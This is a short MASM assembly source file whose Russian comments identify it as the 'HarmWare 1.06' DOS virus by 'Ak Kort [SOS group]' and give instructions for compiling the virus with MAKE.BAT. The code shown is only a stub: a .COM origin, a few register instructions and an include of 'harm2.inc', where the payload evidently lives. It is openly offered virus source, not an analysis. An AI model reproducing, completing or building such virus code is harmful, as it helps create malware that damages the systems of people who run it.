;
;	HarmWare 1.06 by Ak Kort [SOS group]
;
;	Для компиляции вируса используйте MAKE.BAT
;
;	Написан на Microsoft Assembler 6.0
;
;	Все комментарии в отдельных модулях
;
	page 56,255
	.model tiny
	.code
	.startup
	org 100h
BeginVirus:
	mov es,sp
	xor cx,cx
	cli
	include harm2.inc
	
EndVirus:
end